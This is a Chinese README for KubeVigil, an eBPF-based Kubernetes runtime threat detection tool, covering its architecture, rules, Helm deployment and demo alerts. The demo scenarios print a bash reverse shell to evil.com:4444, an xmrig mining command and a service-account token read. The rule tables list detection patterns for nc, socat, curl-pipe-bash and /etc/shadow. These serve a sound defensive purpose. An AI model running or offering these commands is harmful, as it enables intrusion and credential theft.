<div align="center">

# KubeVigil · K8s 守夜人

**基于 eBPF 的 Kubernetes 运行时威胁检测与响应工具**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go&logoColor=white)](https://golang.org)
[![eBPF](https://img.shields.io/badge/eBPF-CO--RE-orange.svg)](https://ebpf.io)
[![Kubernetes](https://img.shields.io/badge/Kubernetes-1.24+-326CE5?logo=kubernetes&logoColor=white)](https://kubernetes.io)
[![Version](https://img.shields.io/badge/version-0.1.0-green.svg)](https://github.com/shuhuNB515/KubeVigil)

</div>

---

## 项目简介

> **传统安全扫描是静态的，但真实攻击是动态的。**

KubeVigil（K8s 守夜人）是一个基于 **eBPF** 的 Kubernetes **运行时威胁检测与自动响应**工具。它直接在 Linux 内核态挂载系统调用 tracepoint，以零侵入方式实时捕获容器内的异常行为，并通过可定制的 YAML 规则引擎进行匹配，一旦检测到威胁即可自动执行隔离、终止、网络阻断等响应策略。

### 核心价值

- **内核态视角，无死角** — eBPF 探针运行在 Linux 内核态，监控 `execve`、`openat`、`connect` 三大关键系统调用，任何用户态程序都无法绕过
- **零侵入，无代理依赖** — 无需修改应用代码、注入 Sidecar 或安装额外 Agent 到业务容器中，KubeVigil 以 DaemonSet 方式独立运行
- **BPF CO-RE，一次编译到处运行** — 采用 Compile Once - Run Everywhere 技术，无需为每个内核版本单独编译 eBPF 程序
- **实时检测 + 自动响应** — 从事件采集到规则匹配到执行响应，全链路毫秒级延迟，威胁一出现即被阻断
- **K8s 原生上下文** — 自动将内核态 PID 映射到 K8s Pod/Namespace，告警自带完整的容器上下文信息
- **YAML 规则，灵活可扩展** — 声明式规则引擎，支持进程黑/白名单、敏感路径监控、CIDR 网段和端口过滤，支持热重载

### 为什么需要 KubeVigil？

| 传统静态扫描 | KubeVigil 运行时防护 |
|---|---|
| 检查镜像中已知漏洞（CVE） | 捕获运行时的未知攻击（0day） |
| 检查 YAML 配置是否规范 | 监控实际系统调用行为 |
| 无法发现 0day 漏洞利用 | 内核态视角，攻击者无法绕过 |
| 无法发现无文件攻击、内存马 | 捕获反弹 Shell、脚本注入 |
| 事后审计，攻击已造成损失 | 实时检测 + 自动响应，秒级阻断 |
| 需要修改应用代码或注入 Sidecar | 零侵入，以 DaemonSet 独立运行 |
| 规则硬编码，更新需重新部署 | YAML 规则热重载，SIGHUP 即生效 |

### 典型检测场景

| 攻击场景 | 检测方式 | 自动响应 |
|---|---|---|
| 攻击者通过漏洞利用建立反弹 Shell | execve 监控 `nc`/`socat` + `/dev/tcp/` 参数 | Kill Pod |
| 容器内运行 `xmrig` 等挖矿程序 | execve 进程黑名单匹配 | Kill Pod |
| `curl \| bash` 远程下载执行恶意脚本 | execve 监控管道命令参数 | Label 隔离 |
| 非授权读取 `/etc/shadow`、K8s Secret | openat 敏感路径监控 | Label 隔离 |
| 与已知 C2 服务器建立连接 | connect CIDR + 端口黑名单 | NetworkPolicy 阻断 |

---

## 核心架构

```
┌─────────────────────────────────────────────────────────────────┐
│                     Kubernetes Cluster                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │                    KubeVigil DaemonSet                    │  │
│  │                                                           │  │
│  │  ┌─────────────────┐    ┌──────────────────────────────┐  │  │
│  │  │   eBPF Probes   │    │     User-space Agent         │  │  │
│  │  │   (Kernel)      │    │     (Go)                     │  │  │
│  │  │                 │    │                              │  │  │
│  │  │  ┌───────────┐  │    │  ┌────────────┐              │  │  │
│  │  │  │  execve   │──┼──Ring──│  Event     │              │  │  │
│  │  │  ├───────────┤  │ Buffer┼─>│  Receiver  │              │  │  │
│  │  │  │  openat   │──┼──┬────┼─>│            │              │  │  │
│  │  │  ├───────────┤  │  │    │  └─────┬──────┘              │  │  │
│  │  │  │  connect  │──┼──┘    │        │                     │  │  │
│  │  │  └───────────┘  │        │        ▼                     │  │  │
│  │  │                 │        │  ┌────────────┐              │  │  │
│  │  │  CO-RE (C)      │        │  │ Rule Engine│              │  │  │
│  │  └─────────────────┘        │  │ (YAML)     │              │  │  │
│  │                             │  └─────┬──────┘              │  │  │
│  │                             │        │                     │  │  │
│  │                             │        ▼                     │  │  │
│  │                             │  ┌────────────┐              │  │  │
│  │                             │  │ K8s Context│              │  │  │
│  │                             │  │ PID → Pod  │              │  │  │
│  │                             │  └─────┬──────┘              │  │  │
│  │                             │        │                     │  │  │
│  │                             │        ▼                     │  │  │
│  │                             │  ┌────────────────────────┐  │  │  │
│  │                             │  │  Response & Remediation│  │  │  │
│  │                             │  │                        │  │  │  │
│  │                             │  │  • Label (Isolate)     │  │  │  │
│  │                             │  │  • Kill Pod            │  │  │  │
│  │                             │  │  • NetworkPolicy       │  │  │  │
│  │                             │  └────────────────────────┘  │  │  │
│  │                             └──────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### 三层架构

| 层 | 组件 | 职责 |
|---|---|---|
| **内核态探针层** | `bpf/probes/probes.bpf.c` | 挂载系统调用 tracepoint，通过 Ring Buffer 发送事件 |
| **用户态分析引擎** | `internal/agent/` + `internal/rules/` | 接收事件、规则匹配、PID→Pod 上下文映射 |
| **响应与加固层** | `internal/k8s/resolver.go` | 调用 K8s API 执行隔离/终止/网络阻断 |

---

## 功能特性

### 监控能力

- **进程执行监控 (execve)** — 捕获容器内所有新启动的进程，含父进程追踪（PPID）
- **文件访问监控 (open)** — 监控对敏感文件的非授权读取
- **网络连接监控 (connect)** — 捕获恶意的外连请求（自动处理网络字节序）

### 运维能力

- **规则热重载** — 发送 `SIGHUP` 信号即可重载规则，无需重启 Agent
- **日志级别控制** — 支持 debug/info/warn/error 四级日志过滤
- **优雅关闭** — 收到 SIGINT/SIGTERM 后优雅关闭 Ring Buffer 和探针
- **线程安全** — 规则引擎读写锁保护，热重载不影响事件处理
- **健康检查** — DaemonSet 配置 livenessProbe，K8s 自动重启异常 Agent

### 内置安全规则

| 规则 | 类型 | 严重等级 | 响应动作 | 描述 |
|---|---|---|---|---|
| `reverse-shell-detected` | execve | 🔴 Critical | Kill Pod | 检测 `nc`、`socat` 等网络工具 + `/dev/tcp/` 可疑参数 |
| `suspicious-download` | execve | 🟠 High | Label | 检测 `curl \| bash` 等可疑下载行为 |
| `crypto-mining` | execve | 🔴 Critical | Kill Pod | 检测 `xmrig`、`minerd` 等挖矿程序 |
| `sensitive-file-access` | open | 🟠 High | Label | 检测对 `/etc/shadow`、K8s Secret 的访问 |
| `c2-communication` | connect | 🔴 Critical | NetworkPolicy | 检测与已知 C2 服务器的通信 |

### 自动响应动作

| 动作 | 说明 |
|---|---|
| `alert` | 仅告警，不执行动作 |
| `label` | 给 Pod 打上隔离标签，触发 NetworkPolicy 阻断 |
| `kill` | 立即终止受感染的 Pod |
| `network_policy` | 标记 Pod 并触发 NetworkPolicy 网络隔离 |

---

## 快速开始

### 前置要求

- Kubernetes >= 1.24
- Linux Kernel >= 5.8（支持 BPF CO-RE）
- 节点已启用 BTF（`/sys/kernel/btf/vmlinux` 存在）
- Helm 3.x

### 一键部署

```bash
# 克隆仓库
git clone https://github.com/shuhuNB515/KubeVigil.git
cd KubeVigil

# Helm 一键安装
helm install kubevigil ./charts/kubevigil \
  --namespace kubevigil \
  --create-namespace
```

### 验证部署

```bash
# 查看 DaemonSet
kubectl get daemonset -n kubevigil

# 查看 Agent 日志
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil -f
```

### 卸载

```bash
helm uninstall kubevigil --namespace kubevigil
```

### 规则热重载

运行中的 Agent 支持通过 SIGHUP 信号热重载规则，无需重启：

```bash
# 查找 Agent PID
kubectl exec -n kubevigil <pod-name> -- kill -HUP 1

# 或者直接修改 ConfigMap，Agent 会自动检测变化
kubectl edit configmap -n kubevigil kubevigil
```

---

## 使用指南

### 自定义规则

编辑 ConfigMap 或创建自定义规则文件：

```yaml
rules:
  # 自定义规则：禁止在 nginx 容器中执行 python
  - name: no-python-in-nginx
    description: "禁止在 nginx 容器中执行 python"
    eventType: execve
    severity: high
    action: kill
    enabled: true
    execve:
      blockedProcesses:
        - python
        - python3
        - pip

  # 自定义规则：监控对数据库凭证的访问
  - name: db-credential-access
    description: "监控数据库凭证文件访问"
    eventType: open
    severity: medium
    action: label
    enabled: true
    open:
      sensitivePaths:
        - /etc/postgresql/
        - /var/lib/mysql/
        - /opt/mssql/

  # 自定义规则：阻断到特定 IP 的连接
  - name: block-malicious-ip
    description: "阻断到已知恶意 IP 的连接"
    eventType: connect
    severity: critical
    action: network_policy
    enabled: true
    connect:
      blockedCIDRs:
        - "203.0.113.0/24"
        - "198.51.100.0/24"
      blockedPorts:
        - 4444
        - 1337
```

通过 Helm Values 自定义：

```bash
helm install kubevigil ./charts/kubevigil \
  --namespace kubevigil --create-namespace \
  --set rules.custom=true \
  --set-file rules.content=./my-rules.yaml
```

### 配置参数

| 参数 | 默认值 | 说明 |
|---|---|---|
| `probe.execve` | `true` | 启用 execve 监控 |
| `probe.open` | `true` | 启用 open 监控 |
| `probe.connect` | `true` | 启用 connect 监控 |
| `probe.ringBufferSize` | `16` | Ring Buffer 大小 (MB) |
| `response.enabled` | `true` | 启用自动响应 |
| `response.defaultAction` | `label` | 默认响应动作 |
| `response.highSeverityAction` | `kill` | 高危规则响应动作 |
| `response.isolationLabelKey` | `kubevigil.io/isolated` | 隔离标签 Key |
| `response.isolationLabelValue` | `true` | 隔离标签 Value |
| `logLevel` | `info` | 日志级别 |

---

## 本地构建

### 从源码构建

```bash
# 安装依赖
sudo apt-get install -y clang llvm libbpf-dev linux-headers-generic

# 编译 eBPF 探针
make bpf

# 编译 Go 二进制
make build

# 或一步完成
make all
```

### 构建 Docker 镜像

```bash
make docker
```

### 运行测试

```bash
make test
```

### Makefile 命令一览

```bash
make help
```

```
  make bpf           - 编译 eBPF 探针
  make build         - 编译 Go 二进制
  make build-local   - 本地编译（不交叉编译）
  make docker        - 构建 Docker 镜像
  make docker-push   - 推送 Docker 镜像
  make helm          - 打包 Helm Chart
  make install       - 安装到 K8s 集群
  make uninstall     - 从集群卸载
  make test          - 运行测试
  make lint          - 代码检查
  make tidy          - 整理 Go 模块
  make clean         - 清理构建产物
```

---

## 项目结构

```
KubeVigil/
├── bpf/
│   └── probes/
│       └── probes.bpf.c          # eBPF 内核态探针 (C, CO-RE)
├── cmd/
│   └── kubevigil/
│       └── main.go               # CLI 入口
├── internal/
│   ├── agent/
│   │   └── agent.go              # 用户态 Agent 核心
│   ├── config/
│   │   └── config.go             # 配置管理
│   ├── event/
│   │   └── event.go              # 事件模型与告警
│   ├── k8s/
│   │   └── resolver.go           # PID→Pod 映射 + 响应执行
│   └── rules/
│       └── engine.go             # YAML 规则引擎
├── pkg/
│   └── signals/
│       └── signals.go            # 信号处理
├── configs/
│   ├── config.yaml               # 全局配置示例
│   └── rules.yaml                # 默认安全规则
├── charts/
│   └── kubevigil/                # Helm Chart
│       ├── Chart.yaml
│       ├── values.yaml
│       └── templates/
│           ├── _helpers.tpl
│           ├── serviceaccount.yaml
│           ├── clusterrole.yaml
│           ├── configmap.yaml
│           └── daemonset.yaml
├── Dockerfile                    # 多阶段构建
├── Makefile                      # 构建自动化
├── go.mod
└── LICENSE
```

---

## 技术栈

| 组件 | 技术 | 说明 |
|---|---|---|
| eBPF 探针 | C + BPF CO-RE | 编译一次，到处运行 |
| 用户态 Agent | Go 1.21 | 云原生标准语言 |
| eBPF 库 | cilium/ebpf | 纯 Go eBPF 加载器 |
| K8s 客户端 | client-go | 官方 K8s Go 客户端 |
| CLI 框架 | cobra | 云原生标准 CLI |
| 配置格式 | YAML | 人类可读的规则定义 |
| 部署方式 | DaemonSet + Helm | 每节点一个 Agent |

---

## 工作原理

### 1. 内核态：eBPF 探针

KubeVigil 使用 BPF CO-RE 技术编写 eBPF 程序，挂载到三个关键系统调用的 tracepoint：

```
tracepoint/syscalls/sys_enter_execve   →  捕获进程执行
tracepoint/syscalls/sys_enter_openat   →  捕获文件访问
tracepoint/syscalls/sys_enter_connect  →  捕获网络连接
```

探针通过 **Ring Buffer** 将事件高效地传递到用户态，每个事件包含 PID、进程名、参数、cgroup ID 等上下文信息。

### 2. 用户态：规则引擎

Agent 从 Ring Buffer 读取原始事件后：

1. **解析事件** — 将二进制数据反序列化为结构化事件
2. **规则匹配** — 根据 YAML 规则进行黑白名单匹配
3. **上下文丰富** — 通过 cgroup ID 将 PID 映射到 K8s Pod/Namespace
4. **生成告警** — 匹配成功则生成告警并触发响应

### 3. 响应层：K8s API 交互

当规则匹配且需要响应时，Agent 调用 K8s API：

- **`label`** — 给 Pod 打上 `kubevigil.io/isolated=true` 标签，配合 NetworkPolicy 实现网络隔离
- **`kill`** — 直接删除受感染的 Pod（GracePeriod=0）
- **`network_policy`** — 打标签触发 NetworkPolicy 阻断所有入出流量

---

## 演示场景

### 场景 1：检测反弹 Shell

攻击者在 Web 漏洞利用后尝试建立反弹 Shell：

```bash
# 攻击者在容器内执行
bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
```

KubeVigil 输出：

```
[ALERT] [EXECVE] 2024-01-15 10:23:45 | Namespace: default, Pod: nginx-xyz | 异常执行了黑名单进程: nc | Rule: reverse-shell-detected | Severity: critical | Action: kill
[K8s] 已终止 Pod: default/nginx-xyz
```

### 场景 2：检测挖矿程序

```bash
# 攻击者在容器内运行挖矿程序
xmrig -o pool.mine.xyz:3333 -u wallet
```

KubeVigil 输出：

```
[ALERT] [EXECVE] 2024-01-15 10:24:12 | Namespace: production, Pod: api-server-abc | 异常执行了黑名单进程: xmrig | Rule: crypto-mining | Severity: critical | Action: kill
[K8s] 已终止 Pod: production/api-server-abc
```

### 场景 3：检测敏感文件访问

```bash
# 攻击者尝试读取 K8s Service Account Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

KubeVigil 输出：

```
[ALERT] [OPEN] 2024-01-15 10:25:30 | Namespace: default, Pod: compromised-pod | 进程 cat 访问了敏感路径: /var/run/secrets/kubernetes.io/serviceaccount/token | Rule: sensitive-file-access | Severity: high | Action: label
[K8s] 已隔离 Pod: default/compromised-pod (标签: kubevigil.io/isolated=true)
```

---

## 路线图

- [x] **阶段一：MVP** — eBPF 探针 + execve 监控 + 实时告警
- [x] **阶段二：规则化** — YAML 规则引擎 + 黑白名单
- [x] **阶段三：自动响应** — K8s API 集成 + 隔离/终止
- [x] **阶段四：部署** — Dockerfile + Helm Chart
- [x] **阶段四+：加固** — 内存对齐修复 + PID 映射 + 规则热重载 + 优雅关闭 + 线程安全 + 健康检查
- [ ] **阶段五：Web Dashboard** — 轻量级 Web 界面展示告警与统计
- [ ] **阶段六：威胁情报集成** — 接入外部威胁情报源
- [ ] **阶段七：eBPF Map 状态追踪** — 进程血缘关系追踪
- [ ] **阶段八：Prometheus 指标** — 安全指标导出与告警

---

## 贡献

欢迎提交 Issue 和 Pull Request！

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/amazing-feature`)
3. 提交更改 (`git commit -m 'Add amazing feature'`)
4. 推送分支 (`git push origin feature/amazing-feature`)
5. 创建 Pull Request

---

## 许可证

[Apache License 2.0](LICENSE)

---

## 致谢

- [cilium/ebpf](https://github.com/cilium/ebpf) — 纯 Go eBPF 库
- [aquasecurity/tracee](https://github.com/aquasecurity/tracee) — eBPF 安全灵感来源
- [Falco](https://github.com/falcosecurity/falco) — 云原生运行时安全先驱

---

<div align="center">

**KubeVigil — 让你的 Kubernetes 集群在夜晚也能安然无恙。**

</div>
